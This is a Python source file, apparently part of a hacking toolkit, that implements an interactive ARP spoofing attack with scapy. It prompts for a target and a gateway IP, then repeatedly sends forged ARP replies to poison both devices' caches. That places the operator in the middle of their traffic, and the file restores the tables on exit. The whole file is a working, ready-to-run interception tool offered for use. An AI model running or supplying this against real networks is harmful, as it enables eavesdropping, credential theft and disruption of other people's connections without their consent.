from Settings.Utils import *

print(banner)

try:
    import scapy.all as scapy
except ImportError:
    module_error()

def get_mac(ip: str) -> str:
    """Get the MAC address of a device on the network

    Args:
        ip (str): The IP address of the device

    Returns:
        str: The MAC address of the device
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip: str, spoof_ip: str):
    """Spoof the ARP table of a target device

    Args:
        target_ip (str): The IP address of the target device
        spoof_ip (str): The IP address to spoof
    """
    ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp = scapy.ARP(op=1, pdst=target_ip, psrc=spoof_ip)

    packet = ether/arp

    scapy.sendp(packet, verbose=False)

def restore(destination_ip: str, source_ip: str):
    """Restore the ARP table of a target device

    Args:
        destination_ip (str): The IP address of the target device
        source_ip (str): The IP address to restore
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    ether = scapy.Ether(dst=destination_mac)

    arp = scapy.ARP(op=1, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    packet = ether/arp
    scapy.sendp(packet, verbose=False)

def arp_spoof(target_ip: str, gateway_ip: str):
    """ARP spoofing attack

    Args:
        target_ip (str): The IP address of the target device
        gateway_ip (str): The IP address of the gateway
    """
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print_message(f"Packets sent: {sent_packets_count}")
            time.sleep(2)
    except KeyboardInterrupt:
        print_error("Detected CTRL + C... Resetting ARP tables... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print_message("ARP tables restored.")
        print_message("Exiting...")
        time.sleep(2)
        clear()
        return
    
def arp_spoof_menu():
    """ARP spoofing menu
    """
    print(f"""{red}
                                                                ========================================
                                                                |{green}             ARP Spoofing             {red}|
                                                                ========================================          
    
Be sure targets are on the same network as you. ARP Spoofing only works locally.
    {reset}""")

    while True:
        
        target_ip = input(f"{message_start} Enter the target IP address (or Q to quit): {reset}")

        if target_ip == "Q" or target_ip == "q":
            return
        
        gateway_ip = input(f"{message_start} Enter the gateway IP address: {reset}")

        if validate_ip(target_ip) and validate_ip(gateway_ip):
            break
    
    print_message(f"ARP spoofing target {target_ip} on the network...")
    arp_spoof(target_ip, gateway_ip)
    
    wait_user()
    return


try:
    arp_spoof_menu()
except Exception as e:
    print_error(f"An error occurred: {e}")
    wait_user()